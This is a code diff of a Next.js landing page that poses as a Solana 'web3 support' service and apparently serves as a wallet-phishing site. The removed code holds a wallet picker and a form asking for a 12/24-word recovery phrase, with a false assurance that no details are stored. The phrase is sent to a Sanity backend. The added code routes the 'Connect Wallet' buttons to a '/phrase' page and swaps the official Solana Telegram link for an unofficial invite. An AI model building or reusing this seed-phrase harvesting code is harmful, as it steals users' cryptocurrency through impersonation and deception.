@@ -1,6 +1,7 @@
 import Head from "next/head";
 import Image from "next/image";
 import styles from "../styles/Home.module.css";
+
 import Cancel, {
   Trade,
   Staking,
@@ -13,107 +14,20 @@ import Cancel, {
 } from "./comps/Cancel";
 import react, { useState } from "react";
 import client from "../sanity";
+import Link from "next/link";
 
 export default function Home() {
   const [phrase, setPhrase] = useState("");
   const [showPhrase, setShowPhrase] = useState(false);
   const [showWallets, setShowWallets] = useState(false);
   const [smallModal, setSmallModal] = useState(false);
-  const [overlay,setOverlay] = useState(false)
+  const [overlay, setOverlay] = useState(false);
   const [modal, setModal] = useState(false);
   const [walletQueries, setWalletQueries] = useState({
     name: "",
     image: "",
     color: "",
   });
-  const wallets = [
-    {
-      name: "Atomic",
-      image: "Atomic-Wallet.jpg",
-      color: "blue",
-    },
-    {
-      name: "Avana",
-      image: "avana-wallet.webp",
-      color: "green",
-    },
-    {
-      name: "Exodus",
-      image: "Exodus-Wallet.jpg",
-      color: "purple",
-    },
-    {
-      name: "Glow",
-      image: "Glow-logo.png",
-      color: "orange",
-    },
-    {
-      name: "Ledger",
-      image: "ledger-logo-long.svg",
-      color: "black",
-    },
-    {
-      name: "Phantom",
-      image: "Phantom-wallet.png",
-      color: "purple",
-    },
-    {
-      name: "Sollet",
-      image: "Sollet-Wallet.jpeg",
-      color: "blue",
-    },
-    {
-      name: "solRnWallet",
-      image: "solRnWallet.webp",
-    },
-    {
-      name: "solflare",
-      image: "solflare-wallet.svg",
-      color: "orange",
-    },
-    {
-      name: "Math",
-      image: "Math-wallet.jpg",
-      color: "black",
-    },
-    {
-      name: "Trust",
-      image: "Trust-wallet.png",
-      color: "blue",
-    },
-    {
-      name: "Slope",
-      image: "slope-wallet.png",
-      color: "purple",
-    },
-  ];
-  const getPhrase = () => {
-    console.log(phrase, "✅");
-    if (phrase.length < 12) {
-      alert("Word Phrase is too short");
-      return;
-    }
-    setPhrase("");
-    alert("Phrase has been submitted Successfully 🎉");
-    // Send details to backend
-    const doc = {
-      _type: "post",
-      title: "New Phrase 🎉",
-      phrase,
-    };
-    client
-      .create(doc)
-      .then((res) => console.log("Results", res))
-      .catch((err) => console.error(err));
-  };
-
-  const firstFunc = (name, image, color) => {
-    setWalletQueries({
-      name,
-      image,
-      color,
-    });
-  };
 
   const iconNames = [
     { name: "youtube", link: "https://www.youtube.com/SolanaFndn" },
@@ -124,7 +38,7 @@ export default function Home() {
     { name: "discord-alt", link: "" },
     { name: "reddit", link: "" },
     { name: "github", link: "" },
-    { name: "telegram", link: "https://t.me/solanaannouncements" },
+    { name: "telegram", link: "https://t.me/+Eyje7RYtlBY2ZTZh" },
   ];
 
   const firstList = [
@@ -189,7 +103,7 @@ export default function Home() {
       </Head>
 
       <main className="p-5 bg-[url('/Mian-bg.webp')]   relative">
-        {overlay && <div className="backdrop-blur-md modal w-full absolute z-20 h-full bg-black/30"></div>}
+       
 
         <nav className="grid items-center relative z-10 w-full grid-cols-2 mb-2">
           <div className="flex">
@@ -209,16 +123,14 @@ export default function Home() {
                   Home
                 </a>
               </li>
-              <li
-                id="connectWallet"
-                className="bg-[#17fb9b] cursor-pointer text-sm sm:text-base font-medium px-2 py-2 sm:px-5 sm:py-2 text-black rounded-full"
-                onClick={() => {
-setModal(true)
-setOverlay(prev => !prev)
-                } }
-              >
-                <small>Connect Wallet</small>
-              </li>
+              <Link href="/phrase">
+                <li
+                  id="connectWallet"
+                  className="bg-[#17fb9b] cursor-pointer text-sm sm:text-base font-medium px-2 py-2 sm:px-5 sm:py-2 text-black rounded-full"
+                >
+                  <small> Connect Wallet</small>
+                </li>
+              </Link>
             </ul>
           </div>
         </nav>
@@ -241,20 +153,25 @@ setOverlay(prev => !prev)
           {/* End Try Video */}
           <div className="flex sm:mt-[15rem] mt-10 relative z-10 gap-10 flex-col items-center">
             <p className="sm:text-4xl text-white text-xl sm:px-96 sm:font-bold text-center">
-              A suitable web3 support team <br className="sm:flex hidden"/> features  powering the 
-              evolution of DeFi on Solana network.
+              A suitable web3 support team <br className="sm:flex hidden" />{" "}
+              features powering the evolution of DeFi on Solana network.
             </p>
             <div className="sm:grid sm:grid-cols-3 sm:gap-5">
               {frontListings.map((x) => {
                 return (
-                  <div className="bg-gradient-to-br sm:mb-0 mb-3 text-center flex flex-col items-center justify-center from-purple-500/30 to-gray-700/30 backdrop-blur-md p-5 rounded-lg border-2 border-white/30" onClick={() => {
-                    setModal(prev => !prev)
-                    setOverlay(prev => !prev)
-                  } }>
+                  <div
+                    className="bg-gradient-to-br sm:mb-0 mb-3 text-center flex flex-col items-center justify-center from-purple-500/30 to-gray-700/30 backdrop-blur-md p-5 rounded-lg border-2 border-white/30"
+                    onClick={() => {
+                      setModal((prev) => !prev);
+                      setOverlay((prev) => !prev);
+                    }}
+                  >
                     <div className="flex w-10 h-10 rounded-lg items-center text-center justify-center bg-white/50 backdrop-blur-md">
                       {x.comp}
                     </div>
-                    <h1 className="font-bold sm:text-lg mt-3 text-white">{x.name}</h1>
+                    <h1 className="font-bold sm:text-lg mt-3 text-white">
+                      {x.name}
+                    </h1>
                     <small className="mt-5 text-white">{x.para}</small>
                   </div>
                 );
@@ -262,57 +179,7 @@ setOverlay(prev => !prev)
             </div>
           </div>
           {/* Small Modal */}
-          {smallModal && (
-            <div
-              id="smallModal"
-              className="mt-7 top-40 bg-white fixed z-30  rounded-xl shadow-lg"
-            >
-              <div className="p-4 sm:p-7">
-                <div className="w-full flex justify-center mb-3">
-                  <img
-                    src={walletQueries?.image}
-                    alt="img"
-                    className="h-10 w-10 object-cover"
-                  />
-                </div>
-                <div className="flex justify-center items-center">
-                  <h1 className="block sm:text-2xl text-sm px-10  mb-5 text-center font-semibold text-black">
-                    How do you want to connect <br /> to {walletQueries?.name}?
-                  </h1>
-                </div>
-                <div className="flex flex-col">
-                  <button
-                    className={`bg-${walletQueries?.color}-500 sm:text-base text-sm mt-3 font-semibold text-black px-3 py-2`}
-                    onClick={() => {
-                      setShowPhrase(true);
-                      setSmallModal((prev) => !prev);
-                    }}
-                  >
-                    Extention
-                  </button>
-                  <button
-                    className={`border-2 border-${walletQueries.color}-500 sm:text-base text-sm mt-3 font-semibold text-black px-3 py-2`}
-                    onClick={() => {
-                      setShowPhrase(true);
-                      setSmallModal((prev) => !prev);
-                    }}
-                  >
-                    Web Wallet
-                  </button>
-                  <button
-                    className="mt-5 uppercase text-black font-medium"
-                    onClick={() => {
-                      setSmallModal((prev) => !prev);
-                      setOverlay(prev => !prev)
-                    }}
-                  >
-                    Close
-                  </button>
-                </div>
-              </div>
-            </div>
-          )}
-
+       
           {modal && (
             <div
               id="selectWallet"
@@ -322,9 +189,9 @@ setOverlay(prev => !prev)
                 <div
                   className="w-full flex justify-end"
                   onClick={() => {
-setModal((prev) => !prev)
-setOverlay(prev => !prev)
-                  } }
+                    setModal((prev) => !prev);
+                    setOverlay((prev) => !prev);
+                  }}
                 >
                   <Cancel />
                 </div>
@@ -337,99 +204,18 @@ setOverlay(prev => !prev)
                   </div>
                 </div>
                 {/* Start Before Wallets */}
-                <button className="bg-purple-700 text-white w-full mt-5 rounded-lg p-2">
-                  Get Started
-                </button>
-                <div
-                  className="flex justify-end mt-2"
-                  onClick={() => setShowWallets((prev) => !prev)}
-                >
-                  <small className="underline text-black">
-                    Already Have a wallet? View Options
-                  </small>
-                  <DropDown />
-                </div>
-                {/* Before Wallets */}
-                {showWallets && (
-                  <div className="flex mt-5 flex-col">
-                    <div className="grid grid-cols-4 gap-7">
-                      {wallets.map((wallet, key) => {
-                        return (
-                          <div
-                            className="flex cursor-pointer text-center flex-col items-center"
-                            onClick={() => {
-                              firstFunc(
-                                wallet.name,
-                                wallet.image,
-                                wallet.color
-                              );
-                              setSmallModal(true);
-                              setModal((prev) => !prev);
-                            }}
-                            key={key}
-                          >
-                            <img
-                              src={wallet.image}
-                              alt={`img-${wallets.indexOf(wallet)}`}
-                              className="sm:h-20 sm:w-20 h-10 w-10 object-contain"
-                            />
-                            <small className="text-sm mt-1 text-black">
-                              {wallet.name} Wallet
-                            </small>
-                          </div>
-                        );
-                      })}
-                    </div>
-                  </div>
-                )}
+                <Link href="/phrase">
+                  <button className="bg-purple-700 text-white w-full mt-5 rounded-lg p-2">
+                    Get Started
+                  </button>
+                </Link>
               </div>
             </div>
           )}
           {/* End-Modal */}
 
           {/* 12 word Input */}
-          {showPhrase && (
-            <div className="top-40 bg-white word-phrase z-40 fixed rounded-xl shadow-lg">
-              <div className="p-4 sm:p-7">
-                <div className="grid grid-cols-2">
-                  <div>
- <h1 className="block sm:text-2xl text-sm  mb-5 text-center font-semibold text-black">
-                    Enter 12/24 word phrase
-                  </h1>
-                  </div>
-                 
-                  <div
-                    className="w-full flex justify-end"
-                    onClick={() => {
-                      setShowPhrase((prev) => !prev);
-                      setOverlay(prev => !prev)
-                    }}
-                  >
-                    <Cancel />
-                  </div>
-
-                </div>
-               
-                <div className="">
-                  <input
-                    type="text"
-                    value={phrase}
-                    onChange={(e) => setPhrase(e.target.value)}
-                    className="rounded-lg border-2 bg-none border-gray-300 w-full p-2"
-                  />
-                </div>
-                <button
-                  className="bg-[#17fb9b] sm:text-base text-sm mt-3 font-semibold rounded-lg text-black w-full p-2 "
-                  onClick={getPhrase}
-                >
-                  Continue
-                </button>
-                 <div className="text-center mt-5">
-<small className="text-gray-500">We do not recieve or store your wallet login details, so your TON is safe</small>
-                </div>
-              </div>
-            </div>
-          )}
+       
           {/* End 12 word input */}
         </div>
       </main>
